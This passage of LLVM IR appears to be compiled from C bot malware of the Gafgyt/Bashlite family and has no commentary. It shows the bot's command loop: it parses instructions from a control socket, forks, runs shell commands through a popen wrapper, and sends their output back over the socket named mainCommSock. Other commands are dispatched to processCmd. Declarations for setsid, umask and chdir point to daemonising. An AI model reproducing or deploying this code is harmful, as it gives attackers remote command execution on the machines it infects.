329:                                              ; preds = %327
  %330 = load i8*, i8** %27, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %27, align 8
  br label %317, !llvm.loop !87

332:                                              ; preds = %327
  %333 = load i8*, i8** %27, align 8
  %334 = load i8, i8* %333, align 1
  %335 = zext i8 %334 to i32
  %336 = icmp eq i32 %335, 0
  br i1 %336, label %337, label %338

337:                                              ; preds = %332
  br label %205, !llvm.loop !86

338:                                              ; preds = %332
  %339 = load i8*, i8** %27, align 8
  store i8 0, i8* %339, align 1
  %340 = load i8*, i8** %26, align 8
  %341 = getelementptr inbounds i8, i8* %340, i64 1
  store i8* %341, i8** %27, align 8
  %342 = load i8*, i8** %26, align 8
  %343 = load i8*, i8** %27, align 8
  %344 = call i64 @strlen(i8* noundef %343) #11
  %345 = getelementptr inbounds i8, i8* %342, i64 %344
  %346 = getelementptr inbounds i8, i8* %345, i64 2
  store i8* %346, i8** %26, align 8
  br label %347

347:                                              ; preds = %367, %338
  %348 = load i8*, i8** %26, align 8
  %349 = load i8*, i8** %26, align 8
  %350 = call i64 @strlen(i8* noundef %349) #11
  %351 = sub i64 %350, 1
  %352 = getelementptr inbounds i8, i8* %348, i64 %351
  %353 = load i8, i8* %352, align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 10
  br i1 %355, label %365, label %356

356:                                              ; preds = %347
  %357 = load i8*, i8** %26, align 8
  %358 = load i8*, i8** %26, align 8
  %359 = call i64 @strlen(i8* noundef %358) #11
  %360 = sub i64 %359, 1
  %361 = getelementptr inbounds i8, i8* %357, i64 %360
  %362 = load i8, i8* %361, align 1
  %363 = zext i8 %362 to i32
  %364 = icmp eq i32 %363, 13
  br label %365

365:                                              ; preds = %356, %347
  %366 = phi i1 [ true, %347 ], [ %364, %356 ]
  br i1 %366, label %367, label %373

367:                                              ; preds = %365
  %368 = load i8*, i8** %26, align 8
  %369 = load i8*, i8** %26, align 8
  %370 = call i64 @strlen(i8* noundef %369) #11
  %371 = sub i64 %370, 1
  %372 = getelementptr inbounds i8, i8* %368, i64 %371
  store i8 0, i8* %372, align 1
  br label %347, !llvm.loop !88

373:                                              ; preds = %365
  %374 = load i8*, i8** %26, align 8
  store i8* %374, i8** %28, align 8
  br label %375

375:                                              ; preds = %387, %373
  %376 = load i8*, i8** %26, align 8
  %377 = load i8, i8* %376, align 1
  %378 = zext i8 %377 to i32
  %379 = icmp ne i32 %378, 32
  br i1 %379, label %380, label %385

380:                                              ; preds = %375
  %381 = load i8*, i8** %26, align 8
  %382 = load i8, i8* %381, align 1
  %383 = zext i8 %382 to i32
  %384 = icmp ne i32 %383, 0
  br label %385

385:                                              ; preds = %380, %375
  %386 = phi i1 [ false, %375 ], [ %384, %380 ]
  br i1 %386, label %387, label %390

387:                                              ; preds = %385
  %388 = load i8*, i8** %26, align 8
  %389 = getelementptr inbounds i8, i8* %388, i32 1
  store i8* %389, i8** %26, align 8
  br label %375, !llvm.loop !89

390:                                              ; preds = %385
  %391 = load i8*, i8** %26, align 8
  store i8 0, i8* %391, align 1
  %392 = load i8*, i8** %26, align 8
  %393 = getelementptr inbounds i8, i8* %392, i32 1
  store i8* %393, i8** %26, align 8
  %394 = load i8*, i8** %28, align 8
  store i8* %394, i8** %29, align 8
  br label %395

395:                                              ; preds = %399, %390
  %396 = load i8*, i8** %29, align 8
  %397 = load i8, i8* %396, align 1
  %398 = icmp ne i8 %397, 0
  br i1 %398, label %399, label %408

399:                                              ; preds = %395
  %400 = load i8*, i8** %29, align 8
  %401 = load i8, i8* %400, align 1
  %402 = zext i8 %401 to i32
  %403 = call i32 @toupper(i32 noundef %402) #11
  %404 = trunc i32 %403 to i8
  %405 = load i8*, i8** %29, align 8
  store i8 %404, i8* %405, align 1
  %406 = load i8*, i8** %29, align 8
  %407 = getelementptr inbounds i8, i8* %406, i32 1
  store i8* %407, i8** %29, align 8
  br label %395, !llvm.loop !90

408:                                              ; preds = %395
  %409 = load i8*, i8** %28, align 8
  %410 = call i32 @strcmp(i8* noundef %409, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.489, i64 0, i64 0)) #11
  %411 = icmp eq i32 %410, 0
  br i1 %411, label %412, label %438

412:                                              ; preds = %408
  %413 = call i32 @listFork()
  %414 = icmp ne i32 %413, 0
  br i1 %414, label %415, label %416

415:                                              ; preds = %412
  br label %205, !llvm.loop !86

416:                                              ; preds = %412
  %417 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %417, i8 0, i64 1024, i1 false)
  %418 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %419 = load i8*, i8** %26, align 8
  %420 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %418, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.490, i64 0, i64 0), i8* noundef %419)
  %421 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %422 = call i32 @fdpopen(i8* noundef %421, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  store i32 %422, i32* %31, align 4
  br label %423

423:                                              ; preds = %428, %416
  %424 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %425 = load i32, i32* %31, align 4
  %426 = call i8* @fdgets(i8* noundef %424, i32 noundef 1024, i32 noundef %425)
  %427 = icmp ne i8* %426, null
  br i1 %427, label %428, label %435

428:                                              ; preds = %423
  %429 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  call void @trim(i8* noundef %429)
  %430 = load i32, i32* @mainCommSock, align 4
  %431 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %432 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %430, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.491, i64 0, i64 0), i8* noundef %431)
  %433 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %433, i8 0, i64 1024, i1 false)
  %434 = call i32 @sleep(i32 noundef 1)
  br label %423, !llvm.loop !91

435:                                              ; preds = %423
  %436 = load i32, i32* %31, align 4
  %437 = call i32 @fdpclose(i32 noundef %436)
  call void @exit(i32 noundef 0) #16
  unreachable

438:                                              ; preds = %408
  store i32 1, i32* %33, align 4
  %439 = load i8*, i8** %26, align 8
  %440 = call i8* @strtok(i8* noundef %439, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #12
  store i8* %440, i8** %34, align 8
  %441 = load i8*, i8** %28, align 8
  %442 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 0
  store i8* %441, i8** %442, align 16
  br label %443

443:                                              ; preds = %474, %438
  %444 = load i8*, i8** %34, align 8
  %445 = icmp ne i8* %444, null
  br i1 %445, label %446, label %476

446:                                              ; preds = %443
  %447 = load i8*, i8** %34, align 8
  %448 = load i8, i8* %447, align 1
  %449 = zext i8 %448 to i32
  %450 = icmp ne i32 %449, 10
  br i1 %450, label %451, label %474

451:                                              ; preds = %446
  %452 = load i8*, i8** %34, align 8
  %453 = call i64 @strlen(i8* noundef %452) #11
  %454 = add i64 %453, 1
  %455 = call noalias i8* @malloc(i64 noundef %454) #12
  %456 = load i32, i32* %33, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %457
  store i8* %455, i8** %458, align 8
  %459 = load i32, i32* %33, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %460
  %462 = load i8*, i8** %461, align 8
  %463 = load i8*, i8** %34, align 8
  %464 = call i64 @strlen(i8* noundef %463) #11
  %465 = add i64 %464, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %462, i8 0, i64 %465, i1 false)
  %466 = load i32, i32* %33, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %467
  %469 = load i8*, i8** %468, align 8
  %470 = load i8*, i8** %34, align 8
  %471 = call i8* @strcpy(i8* noundef %469, i8* noundef %470) #12
  %472 = load i32, i32* %33, align 4
  %473 = add nsw i32 %472, 1
  store i32 %473, i32* %33, align 4
  br label %474

474:                                              ; preds = %451, %446
  %475 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #12
  store i8* %475, i8** %34, align 8
  br label %443, !llvm.loop !92

476:                                              ; preds = %443
  %477 = load i32, i32* %33, align 4
  %478 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 0
  call void @processCmd(i32 noundef %477, i8** noundef %478)
  %479 = load i32, i32* %33, align 4
  %480 = icmp sgt i32 %479, 1
  br i1 %480, label %481, label %495

481:                                              ; preds = %476
  store i32 1, i32* %35, align 4
  store i32 1, i32* %35, align 4
  br label %482

482:                                              ; preds = %491, %481
  %483 = load i32, i32* %35, align 4
  %484 = load i32, i32* %33, align 4
  %485 = icmp slt i32 %483, %484
  br i1 %485, label %486, label %494

486:                                              ; preds = %482
  %487 = load i32, i32* %35, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %488
  %490 = load i8*, i8** %489, align 8
  call void @free(i8* noundef %490) #12
  br label %491

491:                                              ; preds = %486
  %492 = load i32, i32* %35, align 4
  %493 = add nsw i32 %492, 1
  store i32 %493, i32* %35, align 4
  br label %482, !llvm.loop !93

494:                                              ; preds = %482
  br label %495

495:                                              ; preds = %494, %476
  br label %496

496:                                              ; preds = %495, %308
  br label %205, !llvm.loop !86

497:                                              ; preds = %307, %205
  br label %194
}

declare i32 @umask(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8* noundef) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8* noundef, i8* noundef, i64 noundef) #4

; Function Attrs: nounwind
declare i8* @getcwd(i8* noundef, i64 noundef) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @strcasecmp(i8* noundef, i8* noundef) #1

declare i32 @fputs(i8* noundef, %struct._IO_FILE* noundef) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32 noundef, void (i32)* noundef) #4

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nofree nosync nounwind willreturn }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { argmemonly nofree nounwind willreturn }
attributes #10 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { nounwind readnone willreturn }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
!66 = distinct !{!66, !7}
!67 = distinct !{!67, !7}
!68 = distinct !{!68, !7}
!69 = distinct !{!69, !7}
!70 = distinct !{!70, !7}
!71 = distinct !{!71, !7}
!72 = distinct !{!72, !7}
!73 = distinct !{!73, !7}
!74 = distinct !{!74, !7}
!75 = distinct !{!75, !7}
!76 = distinct !{!76, !7}
!77 = distinct !{!77, !7}
!78 = distinct !{!78, !7}
!79 = distinct !{!79, !7}
!80 = distinct !{!80, !7}
!81 = distinct !{!81, !7}
!82 = distinct !{!82, !7}
!83 = distinct !{!83, !7}
!84 = distinct !{!84, !7}
!85 = distinct !{!85, !7}
!86 = distinct !{!86, !7}
!87 = distinct !{!87, !7}
!88 = distinct !{!88, !7}
!89 = distinct !{!89, !7}
!90 = distinct !{!90, !7}
!91 = distinct !{!91, !7}
!92 = distinct !{!92, !7}
!93 = distinct !{!93, !7}
